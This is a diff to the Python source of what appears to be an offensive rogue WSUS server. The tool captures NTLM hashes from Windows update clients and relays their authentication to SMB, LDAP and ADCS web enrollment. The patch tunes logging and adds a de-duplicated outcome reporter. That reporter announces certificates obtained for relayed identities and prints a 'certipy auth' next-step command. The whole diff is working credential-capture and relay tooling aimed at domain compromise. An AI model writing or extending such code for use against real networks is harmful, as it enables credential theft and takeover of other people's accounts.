@@ -2019,8 +2019,20 @@ _STYLE = {
     "FileDownload":           "bright_cyan",
     "HashCapture":            "bold yellow",
     "LDAPPreflight":          "bright_magenta",
+    "CERT ISSUED":            "bold bright_green",
+    "CERT DENIED":            "yellow",
+    "RelayAuth":              "bright_white",
     "WARN":                   "bold red",
 }
+
+# Relay outcomes we have already reported once, so the client's retry loop
+# (especially the ReportingWebService reposting the same rejected identity every
+# second) does not repeat identical lines. Keyed on identity+path+state+auth.
+_relay_result_seen = set()
+# Identities whose captured hash has already been announced at level 0.
+_hash_logged = set()
+# Hosts whose event-batch report has already been shown once at level 0.
+_report_batch_seen = set()
 
 def _ts():
     return datetime.datetime.now().strftime("%H:%M:%S")
@@ -2124,6 +2136,88 @@ def _log(level, ip, action, detail="", direction=""):
                 fh.write(plain + "\n")
         except OSError:
             pass
+
+
+def _report_relay_outcome(ip, path, mode, identity, result):
+    """One clear, de-duplicated line per relay outcome for the default view.
+
+    The Type 3 -> relay -> result handshake is logged in full only under -v. Here we
+    surface just the thing the operator is waiting for: whether the relayed identity got
+    what we asked for. Certificate issuance is the loud, unmissable case.
+    """
+    issued   = bool(result.get("adcs_issued"))
+    state    = result.get("adcs_issue_state", "")
+    service  = result.get("service", "")
+    authed   = result.get("authenticated", False)
+    is_adcs  = service == "adcs-web-enrollment" or mode == "relay-http" and bool(state)
+
+    # Collapse the client's retry storm: report each distinct outcome once. The state key
+    # is mode-aware so a genuinely different result (e.g. list-shares-failed -> shares-listed)
+    # still re-reports.
+    mode_state = state or result.get("smb_action_state", "") or result.get("ldap_action_state", "")
+    key = (identity, path, mode, mode_state, bool(issued), bool(authed))
+    if key in _relay_result_seen:
+        return
+    _relay_result_seen.add(key)
+
+    if issued:
+        pfx    = result.get("adcs_pfx_path", "")
+        cert_id = result.get("adcs_certificate_id", "")
+        with _out_lock:
+            _console.rule("[bold bright_green]CERTIFICATE ISSUED[/]", style="bright_green")
+            _console.print(
+                f"    [bold bright_green]{identity}[/]  ->  [bold]{pfx}[/]"
+                f"   [dim](req_id={cert_id})[/]"
+            )
+            _console.print(
+                f"    [dim]next: certipy auth -pfx {pfx} -dc-ip <DC-IP>[/]"
+            )
+            _console.rule(style="bright_green")
+        return
+
+    if is_adcs:
+        if authed:
+            # Authenticated to /certsrv but no cert - the actionable failure.
+            detail = f"identity={identity} authenticated but NOT issued  state={state}"
+            dbg = result.get("adcs_debug_path", "")
+            if dbg:
+                detail += f"  debug={dbg}"
+            _log(0, ip, "CERT DENIED", detail)
+        else:
+            # Rejected before enrollment (e.g. a local account on the reporting service).
+            _log(1, ip, "CERT DENIED", f"identity={identity} rejected  state={state}")
+        return
+
+    if mode == "relay-smb":
+        # For SMB the operator is watching signing + what the action returned, so surface
+        # those, not just "validated". A machine account often authenticates (relay works)
+        # yet the follow-up action is denied by the target's ACLs - show both.
+        astate = result.get("smb_action_state", "")
+        detail = (
+            f"identity={identity} authenticated={authed} "
+            f"signing_required={result.get('smb_signing_required')} "
+            f"action={astate} shares={result.get('share_count', '')}"
+        )
+        err = result.get("smb_action_error")
+        if err:
+            detail += f"  ({err.split(' - ', 2)[-1].split('{')[0].strip() or err})"
+        _log(0, ip, "RelayAuth" if authed else "WARN", detail)
+        return
+
+    if mode == "relay-ldap":
+        detail = (
+            f"identity={identity} authenticated={authed} "
+            f"signing_required={result.get('ldap_signing_required')} "
+            f"action={result.get('ldap_action_state', '')} "
+            f"whoami={result.get('ldap_whoami', '')}"
+        )
+        _log(0, ip, "RelayAuth" if authed else "WARN", detail)
+        return
+
+    # Generic fallback.
+    ok = result.get("service_validated", authed)
+    _log(0, ip, "RelayAuth" if ok else "WARN",
+         f"identity={identity} service={service or mode} validated={ok}")
 
 
 def _log_raw(label, content, http_request=""):
@@ -2388,7 +2482,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             if getattr(self, "_ntlm_authenticated", False):
                 return "continue"
 
-            _log(0, ip, "WARN", f"no NTLM auth header on {self.path}; sending 401 NTLM")
+            _log(1, ip, "WARN", f"no NTLM auth header on {self.path}; sending 401 NTLM")
             self._drain_request_body()
             self._send_ntlm_401()
             return "handled"
@@ -2398,7 +2492,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
         proxy = auth_info["proxy"]
 
         if msg_type == 1:
-            _log(0, ip, "WARN", f"NTLM Type 1 negotiate received on {self.path}")
+            _log(1, ip, "WARN", f"NTLM Type 1 negotiate received on {self.path}")
             self._drain_request_body()
 
             if mode == "challenge-only":
@@ -2424,7 +2518,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
                 _log(
                     0, ip, "WARN",
-                    f"sending local NTLM Type 2 challenge {challenge.hex()} on {self.path}",
+                    f"sending local NTLM Type 2 challenge {challenge.hex()} on {self.path}",  # verbose
                 )
                 self._send_ntlm_401(type2, proxy=proxy)
                 return "handled"
@@ -2454,7 +2548,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                     self._send_empty_response(502)
                     return "handled"
 
-                _log(0, ip, "WARN",
+                _log(1, ip, "WARN",
                      f"relayed Type 1 to {relay_label} target; returning target Type 2 on {self.path}")
                 self._send_ntlm_401(type2, proxy=proxy)
                 return "handled"
@@ -2496,7 +2590,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             detail = " ".join(detail_parts)
 
             _log(
-                0, ip, "WARN", f"NTLM Type 3 authenticate received on {self.path}  {detail}"
+                1, ip, "WARN", f"NTLM Type 3 authenticate received on {self.path}  {detail}"
             )
             self._ntlm_authenticated = True
             self._ntlm_identity = identity
@@ -2520,8 +2614,14 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                     stored_at = _store_ntlm_capture(
                         ip, self.path, mode, identity, capture
                     )
+                    # Every retry produces a fresh challenge, hence a distinct hash worth
+                    # storing - but logging it once per identity is enough for the operator;
+                    # the rest go to the hash file quietly and stay visible under -v.
+                    cap_key = (identity, capture["version"])
+                    first_capture = cap_key not in _hash_logged
+                    _hash_logged.add(cap_key)
                     _log(
-                        0,
+                        0 if first_capture else 1,
                         ip,
                         "HashCapture",
                         f"{capture['version']} {identity} -> {stored_at}",
@@ -2603,7 +2703,11 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                             f"cookie={result.get('set_cookie', '') or result.get('followup_set_cookie', '')} "
                             f"content_type={result.get('content_type', '')}"
                         )
-                    _log(0, ip, "WARN", f"{relay_label} relay result  {relay_detail}")
+                    # Full detail stays available under -v; the default view gets a single
+                    # clear outcome line instead, deduplicated so the client's retry loop
+                    # does not repeat it.
+                    _log(1, ip, "WARN", f"{relay_label} relay result  {relay_detail}")
+                    _report_relay_outcome(ip, self.path, mode, identity, result)
                     _emit_json_event(
                         {
                             "relay-http": "http_relay_result",
@@ -2672,7 +2776,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
     def do_GET(self):
         ip = self.client_address[0]
-        _log(0, ip, "WARN", f"GET {self.path}", direction="request")
+        _log(1, ip, "WARN", f"GET {self.path}", direction="request")
         if (
             getattr(self.server, "ntlm_protect_downloads", False)
             and getattr(self.server, "ntlm_mode", "off") != "off"
@@ -2695,7 +2799,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
     def do_POST(self):
         ip = self.client_address[0]
-        _log(0, ip, "WARN", f"POST {self.path}", direction="request")
+        _log(1, ip, "WARN", f"POST {self.path}", direction="request")
         if getattr(self.server, "ntlm_mode", "off") != "off":
             decision = self._ntlm_gate()
             if decision == "handled":
@@ -2795,7 +2899,11 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
                     parts.append(kb_match.group())
 
             detail = "  ".join(parts) if parts else ""
-            _log(0, ip, "ReportEventBatch", detail, direction="request")
+            # The client reports an event batch every couple of seconds in a tight loop;
+            # show the first from each host at level 0, the rest under -v.
+            first_report = ip not in _report_batch_seen
+            _report_batch_seen.add(ip)
+            _log(0 if first_report else 1, ip, "ReportEventBatch", detail, direction="request")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
